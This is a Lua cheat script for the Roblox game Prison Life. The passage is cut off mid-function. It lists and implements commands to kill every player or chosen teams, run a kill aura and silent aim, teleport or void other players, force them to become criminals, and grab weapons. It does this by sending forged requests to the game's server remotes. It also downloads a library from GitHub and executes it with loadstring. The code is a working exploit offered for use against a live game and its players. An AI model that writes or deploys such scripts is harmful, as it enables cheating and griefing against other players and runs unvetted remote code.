if game.PlaceId == 155615604 and not game:FindFirstChild("Septex_Admin") then
print([[
  // Commands List:
         unload | Unload the script
         prefix [STRING] | Changed new prefix
         allcmds | tells you the ammount of commands tiger admin has
         refresh / re | Respawn Character and save position
         cmds / cmd | Show commands list
         inmate / in | Change team inmates
         guard / gu | Change team guards
         autore / autorespawn [on/off] | Auto Respawn Character (if died) and auto save Position
         autoremoveff / autorff [ON/OFF] | Auto Remove forcefield (if respawn)
         killaura [on/off] | Activate killaura
         whitelist / wl [PLAYER] | Whitelisted Player
         unwhitelist / unwl [PLAYER] | Blacklisted Player
         kill / oof / die [PLAYER,ALL,TEAM] | Kill a player(s)
	 olditemmethod / oldimethod [ON/OFF] | Teleport to grab item
	 damage / dmg [plr,all,team] [number] | damages a player(s)
	 autodumpcars / autoremovecars / autonocars [on/off] | Auto Dump Cars if command ";bring"
	 criminal / crim / makecrim [plr] | Make crim player
	 antisit [on/off] | Activate antisit
	 infjump [ON/OFF] | Infinite Jumps
	 bring [PLAYER] | Bringing player
	 void [plr] | Teleports player to void
	 view [player] | Viewing player
	 unview | Stopped viewing player
	 copychat [on/off] | Copying chat everyone
	 antifling [ON/OFF] | Activate antifling
	 goto / to [PLAYER] | Teleports to player
	 shotgun / remington / rem | Get remington 870
	 ak-47 / ak | Get ak-47
	 m9 / pistol | Get m9
	 m4a1 / m4 | Get m4a1
	 hammer / ham | Get hammer
	 knife / knive | Get crude knife
	 guns | Get all guns
	 items | Get all items
	 autoguns / aguns [on/off] | Auto get all guns
	 autoitems / aitems [ON/OFF] | Auto get all items
	 loopcrim [plr] | Auto make criminal player
	 unloopcrim [player] | Stopped make criminal player
	 respawn | Respawn Character and not save position
	 opengate | Opened the gate
	 car | Brings a car to you
	 forcefield / ff [on/off] | Activate forcefield
	 speed / ws [number] | changed speed to (number)
	 tp [player1] [player2] | Teleports (player1) To (player2)
	 givekey / key / keycard | Gets a keycard
	 antitase [ON/OFF] | Prevents you from getting tased
	 antishield [on/off] | Deletes other peoples shields
	 autoguard / aguard [ON/OFF] | Auto Team Guard!
	 silentaim / saim [on/off] | Fire and dont miss
	 noclip [ON/OFF] | Go throught walls
	 shootback / antishoot [on/off] | Kills anyone who shoots you
\\
]])
local States = {}
      States.AutoRespawn = true
      States.AutoRemoveff = false
      States.KillAura = false
      States.OldItemMethod = false
      States.AutoDumpCars = false
      States.AntiSit = false
      States.InfJump = false
      States.AutoGuns = false
      States.AutoItems = false
      States.CopyChat = false
      States.AntiFling = false
      States.ArrestAura = false
      States.LoopCrim = false
      States.ff = false
      States.AntiTase = false
      States.AntiShield = false
      States.AutoGuard = false
      States.SilentAim = false
      States.noclip = false
      States.ShootBack = false
local API = {}
      API.Whitelisted = {}
      API.LoopCrim = {}
local Notification = loadstring(Game:HttpGet('https://raw.githubusercontent.com/NoobHubV1/NoobHubV1/main/Notification%20Lib.lua'))()
local plr, Player = game.Players.LocalPlayer, game.Players.LocalPlayer
local Unloaded = false
local Prefix = ";"
local saved = workspace["Criminals Spawn"].SpawnLocation.CFrame
local bgp = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651)
function Create(class,parent,props)
  local new = Instance.new(class)
  for i,v in next, props do
    new[i] = v
  end
  new.Parent = parent
  return new
end
Folder = Create("Folder",game,{Name = "Septex_Admin"})
ScreenGui = Create("ScreenGui",plr.PlayerGui,{Name = "ScreenGui", ResetOnSpawn = false})
TextBox = Create("TextBox",ScreenGui,{Name = "TextBox", BackgroundColor3 = Color3.fromRGB(172, 172, 172), BackgroundTransparency = 0.400, Position = UDim2.new(0.0255349874, 0, 0.800595582, 0), Size = UDim2.new(0, 278, 0, 33), Font = "SourceSans", PlaceholderText = "Press "..Prefix.." To Enter", Text = "", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 23.000, Draggable = true, ClearTextOnFocus = false})
TextButton = Create("TextButton",TextBox,{Name = "TextButton", BackgroundColor3 = Color3.fromRGB(0, 255, 255), BorderSizePixel = 0, Size = UDim2.new(0, 30, 0, 30), Font = Enum.Font.SourceSans, Text = "Not Cooldown", Visible = true, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 15.000})
function API:Notif(name, content, color, time)
  Notification:MakeNotification({
      Name = name,
      Content = content,
      Color = color,
      Time = time
  })
end
function API:swait()
	game:GetService("RunService").Stepped:Wait()
end
function API:Destroy(parent)
  parent:Destroy()
  parent:Remove()
end
function API:Chat(msg)
  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "all")
end

function API:CreateBulletTable(Bullet, Hit)
  local Args = {}
  for i =1,Bullet do
		Args[#Args + 1] = {
			["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
			["Hit"] = Hit,
      ["Cframe"] = CFrame.new(),
		}
  end
  return Args
end
function API:FindPlayer(String,IgnoreError)
	if not String or String == plr or String == "me" then
		return plr
	elseif String == "random" then
		return game.Players:GetPlayers()[math.random(#game.Players:GetPlayers())]
	else
		String = String:gsub("%s+", "")
		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			 if v.Name:lower():match("^" .. String:lower()) or v.DisplayName:lower():match("^" .. String:lower()) then
				return v
		         end
	        end
	        if not IgnoreError then
		         API:Notif("OK", "Player has left or is not in your current game.", Color3.fromRGB(255, 0, 0), 3)
	        end
	        return nil
	end
end
function API:ConvertPosition(Position)
	if typeof(Position):lower() == "position" then
		return CFrame.new(Position)
	else
		return Position
	end
end

function API:GetPart(Target)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	return Target.Character:FindFirstChild("HumanoidRootPart") or Target.Character:FindFirstChild("Head")
end
function API:GetPosition(Player)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	if Player then
		return API:GetPart(Player).CFrame
	elseif not Player then
		return API:GetPart(plr).CFrame
	end
end
function API:GetCameraPosition(Player)
	return workspace["CurrentCamera"].CFrame
end
function API:Loop(Times, calling)
	for i = 1, tonumber(Times) do
		calling()
	end
end
function API:MoveTo(Cframe)
	Cframe = API:ConvertPosition(Cframe)
	local Amount = 5
	for i = 1, Amount do
		API:UnSit()
		Player.Character:WaitForChild("HumanoidRootPart").CFrame = Cframe
		API:swait()
	end
end
function API:WaitForRespawn(Cframe,NoForce)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	local Cframe = API:ConvertPosition(Cframe)
	local CameraCframe = API:GetCameraPosition()
	coroutine.wrap(function()
		local a
		a = Player.CharacterAdded:Connect(function(NewCharacter)
			pcall(function()
				coroutine.wrap(function()
					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					API:Loop(2, function()
						workspace["CurrentCamera"].CFrame = CameraCframe
					end)
				end)()
				NewCharacter:WaitForChild("HumanoidRootPart")
				Cframe = API:ConvertPosition(Cframe)
				local Amount = 10
				if Player.PlayerGui['Home']['hud']['Topbar']['titleBar'].Title.Text:lower() == "lights out" or Player.PlayerGui.Home.hud.Topbar.titleBar.Title.Text:lower() == "lightsout" then
					Amount = 13
				end
				for i = 1, Amount do
					API:UnSit()
					NewCharacter:WaitForChild("HumanoidRootPart").CFrame = Cframe
					API:swait()
				end
			end)
			a:Disconnect()
			Cframe = nil
		end)
		task.spawn(function()
			wait(2)
			if a then
				a:Disconnect()
			end
		end)
	end)()
end
function API:ChangeTeam(TeamPath,NoForce,Pos)
	if TeamPath == game.Teams.Inmates then
		pcall(function()
		repeat task.wait() until game:GetService("Players").LocalPlayer.Character
			game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

			API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
		end)
		workspace.Remote.TeamEvent:FireServer("Bright orange")
	elseif TeamPath == game.Teams.Guards then
		if API:GuardsFull("b") then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			plr.CharacterAdded:Wait()
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat wait()
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			until plr.Team == game.Teams.Guards
		else
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright blue")
		end
	elseif TeamPath == game.Teams.Criminals then
		if Player.Team == game.Teams.Inmates then
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		elseif plr.Team == game.Teams.Guards then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		elseif Player.Team == game.Teams.Criminals then
		if API:GuardsFull("c") then
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			plr.CharacterAdded:Wait()
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
			workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		else
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			workspace.Remote.TeamEvent:FireServer("Bright blue")
			plr.CharacterAdded:Wait()
			pcall(function()
			repeat task.wait() until game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

				API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
			end)
			repeat task.wait()
				plr.Character.Head.CanCollide = false
				workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
			until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
		end
		end
	elseif TeamPath == game.Teams.Neutral then
		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
	end
end
function API:GuardsFull(a)
  if a == "b" then
    return #game.Teams.Guards:GetPlayers() == 8 and plr.Team == game.Teams.Guards
  elseif a == "c" then
    return #game.Teams.Guards:GetPlayers() == 8 and plr.Team ~= game.Teams.Guards
  end
end
function API:UnSit()
  if plr.Character.Humanoid.Sit then
	game.Players.LocalPlayer.Character.Humanoid.Sit = false
  end
end
function API:Refresh()
  API:ChangeTeam(plr.Team)
end
local ChangeState = function(Type,StateType)
  local Value = nil
	if Type and typeof(Type):lower() == "string" and (Type):lower() == "on" then
		Value = true
	elseif Type and typeof(Type):lower() == "string" and (Type):lower() == "off" then
		Value = false
	elseif typeof(Type):lower() == "boolean" then
		Value = Type
	else
		Value = not States[StateType]
	end
	States[StateType] = Value
	API:Notif('OK', StateType.." has been changed to "..tostring(Value), Color3.fromRGB(0, 255, 0), 3)
	return Value
end
function API:KillPlayer(Target,Bullet,Failed,DoChange)
  local Bullets = API:CreateBulletTable(Bullet, Target.Character.Head)
	if not Target or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
		return
	end
	repeat API:swait() until not Target.Character:FindFirstChildOfClass("ForceField")
	local CurrentTeam = nil
	if Target.Team == Player.Team then
		if Target.Team~= game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Criminals,true)
		elseif Target.Team == game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Inmates,true)
			plr.CharacterAdded:Wait() wait()
		end
  end
	local Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47")
	repeat API:swait() API:GetGun("AK-47") Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47") until Gun
	task.spawn(function()
      game.ReplicatedStorage.ShootEvent:FireServer(Bullets, Gun)
      game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
  end)
	coroutine.wrap(function()
		wait(.7)
		pcall(function()
			if Target.Character:FindFirstChildOfClass("Humanoid").Health >1 and not Failed then
				API:KillPlayer(Target,Bullet,true)
			end
		end)
	end)()
	if CurrentTeam and not Player.Team == CurrentTeam and not DoChange then
		wait(.3)
		API:ChangeTeam(CurrentTeam,true)
  end
end
function API:GetGun(Item, Ignore)
	if States.OldItemMethod == false and not Unloaded then
		task.spawn(function()
			if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
				workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
					Position = Player.Character.Head.Position,
					Parent = workspace.Prison_ITEMS.giver:FindFirstChild(Item, true)
				})
			end
		end)
	elseif States.OldItemMethod and not Unloaded then
		if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
			local LastPosition = API:GetPosition()
			repeat task.wait()
				API:UnSit()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP.CFrame
				coroutine.wrap(function()
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP)
				end)()
			until plr.Character:FindFirstChild(Item) or plr.Backpack:FindFirstChild(Item)
			API:MoveTo(LastPosition)
		end
	end
end
function API:GetSingle(Item, Ignore)
	if States.OldItemMethod == false and not Unloaded then
		task.spawn(function()
			workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
				Position = Player.Character.Head.Position,
				Parent = workspace.Prison_ITEMS.single:FindFirstChild(Item, true)
			})
		end)
	elseif States.OldItemMethod and not Unloaded then
		if not plr.Character:FindFirstChild(Item) or not plr.Backpack:FindFirstChild(Item) then
			local LastPosition = API:GetPosition()
			repeat task.wait()
				API:UnSit()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Prison_ITEMS.giver:FindFirstChild(Item).ITEMPICKUP.CFrame
				coroutine.wrap(function()
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single:FindFirstChild(Item).ITEMPICKUP)
				end)()
			until plr.Character:FindFirstChild(Item) or plr.Backpack:FindFirstChild(Item)
			API:MoveTo(LastPosition)
		end
	end
end
function API:killall(TeamToKill,Bullet)
	if TeamToKill == game.Teams.Neutral then
		local LastTeam = Player.Team
		local Args = {}
		if LastTeam ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v and v ~= game.Players.LocalPlayer and not table.find(API.Whitelisted,v) and v ~= nil and v.Team == game.Teams.Inmates or v.Team == game.Teams.Guards then
				if not v.Character and not v.Character.Head and not v.Character.Humanoid <1 or not v.Character:FindFirstChild("ForceField") then
					for i =1,Bullet do
					        Args[#Args + 1] = {
							["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
							["Hit"] = v.Character.Head,
							["Cframe"] = CFrame.new(),
						}
					end
				end
			end
		end

		local Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47")
		repeat task.wait() API:GetGun("AK-47") Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47") until Gun

		pcall(function()
			game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
			game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
		end)
		API:ChangeTeam(game.Teams.Inmates)
		plr.CharacterAdded:Wait()
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v and v ~= game.Players.LocalPlayer and not table.find(API.Whitelisted,v) and v ~= nil then
				if not v.Character and not v.Character.Head and not v.Character.Humanoid <1 or not v.Character:FindFirstChild("ForceField") then
					for i =1,Bullet do
					        Args[#Args + 1] = {
							["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
							["Hit"] = v.Character.Head,
							["Cframe"] = CFrame.new(),
						}
					end
				end
			end
		end
			
		local Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47")
		repeat task.wait() API:GetGun("AK-47") Gun = Player.Character:FindFirstChild("AK-47") or Player.Backpack:FindFirstChild("AK-47") until Gun

		pcall(function()
			game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
			game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
		end)
	end
	if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards then
		if Player.Team ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
		end
	elseif TeamToKill == game.Teams.Criminals then
		if Player.Team ~= game.Teams.Inmates then
			API:ChangeTeam(game.Teams.Inmates)
			plr.CharacterAdded:Wait() wait()
		end
	end
	if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards or TeamToKill == game.Teams.Criminals then
	local Args = {}
	for i,v in pairs(TeamToKill:GetPlayers()) do
		if v and v~=Player and  not table.find(API.Whitelisted,v) then
			for i =1,Bullet do
				Args[#Args + 1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Hit"] = v.Character.Head,
					["Cframe"] = CFrame.new(),
				}
			end
		end
	end
	local Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47")
	repeat task.wait() API:GetGun("AK-47") Gun = Player.Backpack:FindFirstChild("AK-47") or Player.Character:FindFirstChild("AK-47") until Gun

	pcall(function()
		game.ReplicatedStorage.ShootEvent:FireServer(Args, Gun)
		game.ReplicatedStorage.ReloadEvent:FireServer(Gun)
	end)
	end
end
function IsTeamCommandCheck(String)
	for i,v in pairs(game.Teams:GetChildren()) do
		if v and v.Name:lower() == String:lower() then
			return v
		end
	end
	return nil
end
function API:AllGuns()
	if bgp then
		repeat wait()
			API:GetGun("M4A1")
		until plr.Backpack:FindFirstChild("M4A1")
	end
	repeat wait()
		API:GetGun("Remington 870")
	until plr.Backpack:FindFirstChild("Remington 870")
	repeat wait()
		API:GetGun('AK-47')
	until plr.Backpack:FindFirstChild("AK-47")
	repeat wait()
		API:GetGun("M9")
	until plr.Backpack:FindFirstChild("M9")
end
function API:AllItems()
	if bgp then
		repeat wait()
			API:GetGun("M4A1")
		until plr.Backpack:FindFirstChild("M4A1")
	end
	repeat wait()
		API:GetGun("Remington 870")
	until plr.Backpack:FindFirstChild("Remington 870")
	repeat wait()
		API:GetGun("AK-47")
	until plr.Backpack:FindFirstChild("AK-47")
	repeat wait()
		API:GetGun("M9")
	until plr.Backpack:FindFirstChild("M9")
	repeat wait()
		API:GetSingle("Hammer")
	until plr.Backpack:FindFirstChild("Hammer")
	repeat wait()
		API:GetSingle("Crude Knife")
	until plr.Backpack:FindFirstChild("Crude Knife")
	Instance.new("HopperBin",plr.Backpack).BinType = 3
	Instance.new("HopperBin",plr.Backpack).BinType = 4
end
function API:bring(Target,TeleportTo,MoreTP,DontBreakCar)
	if not IsBringing and Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>0 and Target.Character:FindFirstChildOfClass("Humanoid").Sit == false then
		if not TeleportTo then
			TeleportTo = API:GetPosition()
		end
		local Orgin = API:GetPosition()
		local CarPad = workspace.Prison_ITEMS.buttons["Car Spawner"]
		local car = nil
		local Seat = nil
		local Failed = false
		local CheckForBreak = function()
			if not Target or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health<1 or Player.Character:FindFirstChildOfClass("Humanoid").Health<1 then
				Failed = true
				return true
			else
				return nil
			end
		end

		for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
			if v then
				if v:WaitForChild("Body"):WaitForChild("VehicleSeat").Occupant == nil then
					car = v
				end
			end
		end
		if not car then
			coroutine.wrap(function()
				if not car then
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end
			end)()
			repeat task.wait()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"].CFrame)
				task.spawn(function()
					workspace.Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"])
				end)
				if CheckForBreak() then
					break
				end
			until car
		end
		car:WaitForChild("Body"):WaitForChild("VehicleSeat")
		car.PrimaryPart = car.Body.VehicleSeat
		Seat = car.Body.VehicleSeat
		repeat task.wait()
			Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
		until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
		wait() --// so it doesnt break
		repeat task.wait()
			if CheckForBreak() or not Player.Character:FindFirstChildOfClass("Humanoid") or Player.Character:FindFirstChildOfClass("Humanoid").Sit == false then
				break
			end
			car.PrimaryPart = car.Body.VehicleSeat
			if Target.Character:FindFirstChildOfClass("Humanoid").MoveDirection.Magnitude >0 then
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-6))
			else
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))
			end
		until Target.Character:FindFirstChildOfClass("Humanoid").Sit == true
		if Failed then
			API:Notif("Error", 'Failed to bring the player!', Color3.fromRGB(255, 0, 0), 3)
			return
		end
		for i =1,10 do
			car:SetPrimaryPartCFrame(TeleportTo)
			task.wait()
		end
		wait(.1)
		task.spawn(function()
			if not Unloaded and States.AutoDumpCars and not DontBreakCar then
				repeat task.wait() until Target.Character:FindFirstChildOfClass("Humanoid").Sit == false
				repeat wait()
					Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
				until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
				for i =1,10 do
					car:SetPrimaryPartCFrame(CFrame.new(30, 30, 30))
					API:swait()
				end
				API:UnSit()
				API:MoveTo(Orgin)
			end
		end)
		if not Unloaded and not States.AutoDumpCars then
			API:UnSit()
			API:MoveTo(Orgin)
		end
	else
		API:Notif("Error", 'Player has died or is sitting or an unknown error.', Color3.fromRGB(255, 0, 0), 3)
	end
end
function API:BadArea(player)
	local mod = require(game.ReplicatedStorage["Modules_client"]["RegionModule_client"])
	local a = pcall(function()
		if mod.findRegion(player.Character) then
			mod = mod.findRegion(player.Character)["Name"]
		end
	end)
	if not a then
		return
	end
	for i, v in pairs(game:GetService("ReplicatedStorage").PermittedRegions:GetChildren()) do
		if v and mod == v.Value then
			return false
		end
	end
	return true
end
function API:MKILL(PLR)
	local OldPos = API:GetPosition()
	repeat task.wait()
		plr.Character.HumanoidRootPart.CFrame = PLR.Character.HumanoidRootPart.CFrame
		pcall(function()
			game.ReplicatedStorage.meleeEvent:FireServer(PLR)
		end)
	until PLR.Character.Humanoid.Health > 0 or PLR.Character:FindFirstChild("ForceField")
	API:MoveTo(OldPos)
end
function PlayerChatted(Message)
  if Unloaded then return end
  local args = Message:split(" ")
  function Command(Cmd)
    return args[1] == Prefix..Cmd
  end
  function NotCommand(Cmd)
    return args[1] ~= Prefix..Cmd
  end
  if Command("unload") then
    API:Destroy(ScreenGui)
    API:Destroy(game:FindFirstChild("Septex_Admin"))
    workspace.CurrentCamera.CameraSubject = plr.Character
    Unloaded = true
    Cooldown = false
    API:Notif("Unload", 'Script is unloaded', Color3.fromRGB(55, 155, 255), 5)
  end
  if Command("prefix") then
    local New = args[2]
    if New and tostring(New) then
      local NewPrefix = tostring(New)
      Prefix = NewPrefix
      TextBox.PlaceholderText = "Press "..NewPrefix.." To Enter"
      API:Notif("OK", 'prefix set to '..NewPrefix, Color3.fromRGB(0, 255, 0), 3)
    end
  end
  if Command("re") or Command("refresh") then
    API:Refresh()
    API:Notif("OK", "Respawn Character and save position", Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("cmds") or Command("cmd") then
    API:Notif("Cmds", "The commands are listed in the console! \n Press F9 to view or chat /console", Color3.fromRGB(0, 0, 205), 3)
  end
  if Command("inmate") or Command("in") then
    API:ChangeTeam(game.Teams.Inmates)
    API:Notif("OK", 'Change Team Inmates', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("guard") or Command("gu") then
    if not API:GuardsFull("c") then
      API:ChangeTeam(game.Teams.Guards)
      API:Notif("OK", 'Change Team Guards', Color3.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Guards Full!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("autore") or Command("autorespawn") then
    ChangeState(args[2],"AutoRespawn")
  end
  if Command("autoremoveff") or Command("autorff") then
    ChangeState(args[2],"AutoRemoveff")
  end
  if Command("killaura") then
    local value = ChangeState(args[2],"KillAura")
    if value then
      while wait() do
        if States.KillAura then
          for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= plr and not table.find(API.Whitelisted, v) then
              if v.Character.Humanoid.Health > 0 or not v.Character:FindFirstChild("ForceField") then
                game.ReplicatedStorage.meleeEvent:FireServer(v)
              end
            end
          end
        end
      end
    end
  end
  if Command("whitelist") or Command("wl") then
    local Player = API:FindPlayer(args[2])
    if not table.find(API.Whitelisted, Player.Name) then
      table.insert(API.Whitelisted, Player.Name)
      API:Notif("OK", 'Whitelisted '..Player.DisplayName, Color3.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Player is already whitelist!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("unwhitelist") or Command("unwl") then
    local Player = API:FindPlayer(args[2])
    if table.find(API.Whitelisted, Player.Name) then
      table.remove(API.Whitelisted,table.find(API.Whitelisted, Player.Name))
      API:Notif("OK", 'Blacklisted '..Player.DisplayName, Color.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Player is not already whitelist!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("kill") or Command("oof") or Command("die") then
    local Team = IsTeamCommandCheck(args[2])
    if args[2] == "all" or args[2] == 'others' or args[2] == "everyone" then
	API:killall(game.Teams.Neutral,10)
	API:Notif("OK", 'Killed '..args[2], Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Inmates then
	API:killall(game.Teams.Inmates,10)
	API:Notif("OK", 'Killed inmates', Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Guards then
	API:killall(game.Teams.Guards,10)
	API:Notif("OK", 'Killed guards', Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Criminals then
	API:killall(game.Teams.Criminals,10)
	API:Notif("OK", 'Killed criminals', Color3.fromRGB(0, 255, 0), 3)
    else
	local Target = API:FindPlayer(args[2])
	if Target then
		API:KillPlayer(Target,10)
	end
    end
  end
  if Command("olditemmethod") or Command("oldimethod") then
    ChangeState(args[2],"OldItemMethod")
  end
  if Command("damage") or Command("dmg") then
	local Team = IsTeamCommandCheck(args[2])
	local bullet = tonumber(args[3])
    if args[2] == "all" or args[2] == 'others' or args[2] == "everyone" then
	if bullet ~= nil then
		API:killall(game.Teams.Neutral,bullet)
		API:Notif("OK", 'Damages '..args[2]..' '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Inmates then
	if bullet ~= nil then
		API:killall(game.Teams.Inmates,bullet)
		API:Notif("OK", 'Damages inmates '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Guards then
	if bullet ~= nil then
		API:killall(game.Teams.Guards,bullet)
		API:Notif("OK", 'Damages guards '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Criminals then
	if bullet ~= nil then
		API:killall(game.Teams.Criminals,bullet)
		API:Notif("OK", 'Damages criminals '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    else
	local Target = API:FindPlayer(args[2])
	if Target then
		if bullet ~= nil then
			API:KillPlayer(Target,bullet)
			API:Notif("OK", 'Damages '..Target.DisplayName..' '..bullet, Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
		end
	end
    end
  end
  if Command("autodumpcars") or Command('autoremovecars') or Command("autonocars") then
    ChangeState(args[2],"AutoDumpCars")
  end
  if Command("criminal") or Command("crim") or Command("makecrim") then
	if args[2] then
		local Target = API:FindPlayer(args[2])
		if Target then
			if Target.Team ~= game.Teams.Criminals then
				API:bring(Target, saved)
				API:Notif("OK", 'Made '..Target.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
			else
